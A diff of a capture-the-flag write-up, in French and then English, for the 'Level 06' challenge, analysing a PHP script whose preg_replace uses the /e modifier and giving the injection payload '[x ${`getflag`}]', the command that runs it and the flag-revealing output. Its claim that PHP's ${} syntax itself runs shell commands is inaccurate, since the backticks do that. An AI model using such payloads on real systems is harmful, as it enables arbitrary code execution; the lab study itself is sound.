@@ -1,111 +1,92 @@
-## Level 06: 
-  
-1. 
-    Suite au login, on remarque 2 ficheris présents: ```level06```et ```level06.php```.  
-    On essaye d'éxecuter le binaire `level06`:
-    ```bash
-    PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
-    ```  
-    Nous comprenons alors qu'il va falloir examiner et utiliser le fichier `level06.php`.  
-    Nous examinons le contenu du fichier php :
-    ```bash
-    cat level06.php
-    ```
-    Output:
-    ```php
-    #!/usr/bin/php
-    <?php
-    function y($m) { 
-        $m = preg_replace("/\./", " x ", $m);
-        $m = preg_replace("/@/", " y", $m);
-        return $m; 
-    }
+## Level 06: PHP Regex Injection Vulnerability
 
-    function x($y, $z) { 
-        $a = file_get_contents($y);
-        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-        $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
-        return $a;
-    }
+### Goal
+Exploit a PHP regex vulnerability in a web application to execute arbitrary commands and retrieve the flag.
 
-    $r = x($argv[1], $argv[2]);
-    print $r;
-    ?>
-    ```
-2. Analyse du script ```level06.php```:  
-Le script ```level06.php``` définit deux fonctions, y et x, qui manipulent des chaînes de caractères via des remplacements avec des expressions régulières et exécutent des actions sur des fichiers.
+## Steps
 
-    2.1 Prise d'arguments en ligne de commande:  
-    Le script prend 2 arguments ```$argv[1]``` et ```$argv[2]``` en ligne de commande :
-    ```php
-    $r = x($argv[1], $argv[2]); 
-    ```
+### I - Analysis
 
-    2.2  La fonction x:  
-    ```php
-    function x($y, $z) { 
-    $a = file_get_contents($y);
-    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-    $a = preg_replace("/\[/", "(", $a); 
-    $a = preg_replace("/\]/", ")", $a);
-    return $a;
-    }
-    ```
-    Cette fonction fait plusieurs choses :
-    - Chargement de fichier
-        ```php
-        $a = file_get_contents($y);
-        ```  
-        Cette ligne permet de charger le fichier, dont le chemin est fourni par `$y`, dans la variable `$a` en utilisant `file_get_contents($y)`
-    - 1er remplacement:
-        ```php
-        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-        ```  
-        Cette ligne recherche des motifs dans `$a` correspondant à `[x ...]` où `...` peut être n'importe quel texte. La partie capturée après `[x` (désignée par `(.*)`) est passée en argument à la fonction `y`. Puis, Le contenu `[x ...]`est remplacé par le résultat de la fonction `y(...)`.
-    - 2eme et 3eme remplacement:
-        ```php
-        $a = preg_replace("/\[/", "(", $a);
-        $a = preg_replace("/\]/", ")", $a);
-        ```  
-        Ces lignes permettent de remplacer tous les `[` par des `(` ainsi que tous les `]` par des `)`.  
+1. **Initial Discovery**  
+After logging in, we find two files in the directory:
+- `level06` (executable binary)
+- `level06.php` (PHP script)
 
-    2.3  La fonction y:  
-    ```php
-    function y($m) { 
-        $m = preg_replace("/\./", " x ", $m);
-        $m = preg_replace("/@/", " y", $m);
-        return $m; 
-    }
-    ```
-    Cette fonction prend une chaîne de caractères m en entrée, applique 2 remplacements avec des expressions régulières, et retourne la chaîne modifiée :
-    - Elle remplace tous les . (points) par la chaîne x (un espace, un "x", et un autre espace).
-    - Elle remplace tous les @ (arobases) par la chaîne y (un espace suivi d'un "y").  
+2. **Initial Testing**  
+When executing the binary `level06`, we get:
+```bash
+PHP Warning: file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+```
 
-3. Analyse de la faille :  
-    Dans la fonction x, une ligne nous intéresse:
-    ```php
-    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-    ```
-    La fonction preg_replace en PHP permet de rechercher des motifs dans une chaîne de caractères et de les remplacer par une autre chaîne. Elle prend trois arguments :
-    - Le premier argument : L'expression régulière `"/(\[x (.*)\])/e" `
-    - Le deuxième argument : La chaîne de remplacement `"y(\"\\2\")"`
-    - Le troisième argument : La chaîne d'entrée `$a`.
-    
-    La particularité ici réside dans l'usage du modificateur /e, qui est notre faille:
-    
-    - Le modificateur /e signifie que PHP évaluera la chaîne de remplacement comme du code PHP.
-    - Cela permet d’exécuter du code PHP arbitraire dans la chaîne de remplacement.
-    
-    Ainsi, pour exploiter la faille, il suffit que la chaîne d'entrée `$a` soit `[x ${getflag}]` pour que le script éxecute la commande shell `${getflag}`. ( En PHP la syntaxe `${}` est utilisée pour l’exécution de commandes shell.)  
+3. **Source Code Analysis**  
+Examining `level06.php` reveals:
+```php
+#!/usr/bin/php
+<?php
+function y($m) { 
+	$m = preg_replace("/\./", " x ", $m);
+	$m = preg_replace("/@/", " y", $m);
+	return $m; 
+}
 
-4. Exploitation de la faille:  
-    Pour exploiter cette faille, nous allons créer un fichier temporaire `flag06` dans `/tmp/` contenant ```[x ${`getflag`}]```:
-    ```bash
-    echo '[x ${`getflag`}]' > /tmp/flag06
-    ```  
-    et nous allons ensuite éxecuter le binaire `level06` avec le fichier `/tmp/flag06` argument.  
-    Output:
-    ```bash
-    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
-     in /home/user/level06/level06.php(4) : regexp code on line 1
-    ```
+function x($y, $z) { 
+	$a = file_get_contents($y);
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	$a = preg_replace("/\[/", "(", $a);
+	$a = preg_replace("/\]/", ")", $a);
+	return $a;
+}
+
+$r = x($argv[1], $argv[2]);
+print $r;
+?>
+```
+
+### II - Code Breakdown
+
+1. **Script Structure**  
+- Takes two command-line arguments: `$argv[1]` and `$argv[2]`
+- Contains two functions: `x()` and `y()`
+
+2. **Function x() Analysis**  
+- Reads file content using `file_get_contents($y)`
+- Performs three regex replacements:
+	1. Matches `[x ...]` patterns and processes them with function y()
+	2. Replaces `[` with `(`
+	3. Replaces `]` with `)`
+
+3. **Function y() Analysis**  
+- Performs two string replacements:
+	1. Replaces `.` with ` x `
+	2. Replaces `@` with ` y`
+
+### III - Vulnerability Analysis
+
+The vulnerability lies in the regex replacement using the `/e` modifier:
+```php
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+```
+
+Key points:
+- The `/e` modifier in PHP causes the replacement string to be evaluated as PHP code
+- This allows for arbitrary code execution through carefully crafted input
+- PHP's `${}` syntax can be used for shell command execution
+
+### IV - Exploitation
+
+1. **Create Exploit File**
+   Create a temporary file containing the payload:
+   ```bash
+   echo '[x ${`getflag`}]' > /tmp/flag06
+   ```
+
+2. **Execute the Exploit**
+   Run the binary with our payload file:
+   ```bash
+   ./level06 /tmp/flag06
+   ```
+   Output:
+   ```bash
+   PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+    in /home/user/level06/level06.php(4) : regexp code on line 1
+   ```
